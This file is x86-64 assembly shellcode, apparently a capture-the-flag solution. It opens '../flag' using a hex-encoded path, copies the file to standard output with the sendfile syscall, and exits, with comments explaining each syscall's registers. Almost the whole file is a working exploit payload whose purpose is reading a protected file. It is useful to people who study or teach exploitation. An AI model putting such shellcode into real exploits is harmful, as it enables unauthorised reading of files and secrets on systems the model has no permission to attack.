.global _start 
_start:
.intel_syntax noprefix

        # open(const char *pathname, int flags, mode_t mode);
        # rax	System Call	 rdi	                rsi	        rdx
        #  2	sys_open	 const char* filename	int flags	int mode

        push 2
        pop rax # 2 open syscall
        xor rsi, rsi # 0 O_RDONLY 
        xor rdx, rdx # 0 ignore
        mov rdi, 0x67616c662f2e2e6a # j../flag reverse the filename and convert to hex
        shr rdi, 8
        push rdi 
        push rsp
        pop rdi
        syscall


        # sendfile(int out_fd, int in_fd, off_t *offset, size_t count);
        # rax    System Call     rdi             rsi             rdx             r10   
        # 40     sys_sendfile    int out_fd      int in_fd       off_t* offset   size_t count    
        
        push rax # in_fd
        pop rsi 
        push 1 # out_fd 
        pop rdi 
        xor rdx, rdx # no offset
        mov r10, 0x11111111
        push 40 # sys_sendfile
        pop rax
        syscall 


        # exit(int status);
        # rax	System Call	 rdi
        # 60	sys_exit	 int error_code
        
        push 60 
        pop rax
        xor rdi, rdi
        syscall

        # mov rax, 60 # sys_exit
        # mov rdi, 0 # exit code
        # syscall
